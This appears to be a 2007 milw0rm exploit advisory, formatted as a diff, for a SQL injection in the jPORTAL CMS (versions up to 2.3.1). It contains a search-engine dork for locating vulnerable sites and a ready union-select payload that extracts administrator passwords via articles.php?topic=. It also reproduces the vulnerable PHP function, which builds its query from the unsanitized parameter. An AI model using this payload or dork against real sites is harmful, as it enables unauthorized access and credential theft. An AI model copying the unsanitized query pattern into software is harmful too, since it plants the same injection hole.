@@ -1,0 +1,24 @@
+Title:jPORTAL =< 2.3.1 and  Remote SQL Injection Vulnerability
+Dork:  intext:"jPORTAL 2" & inurl:"articles.php?topic="
+
+Autor:  Alexsize
+E-Mail: Alexsize@mail.ru
+Site:   Antichat.ru
+
+
+articles.php?topic=-3+union+select+1,pass,3,4,5+from+admins/
+
+Vuln code:
+
+function topic_name($a)  
+{     
+global $topic_tbl; 
+$query = "SELECT * FROM $topic_tbl WHERE id=$a"; 
+$result = mysql_query($query);   
+$r = mysql_fetch_array($result);     
+return '<a href="articles.php?topic='.$a.'" class="t_main">'.$r['title'].'</a>';   
+} 
+
+C уважением, Alexsize.
+
+# milw0rm.com [2007-11-09]
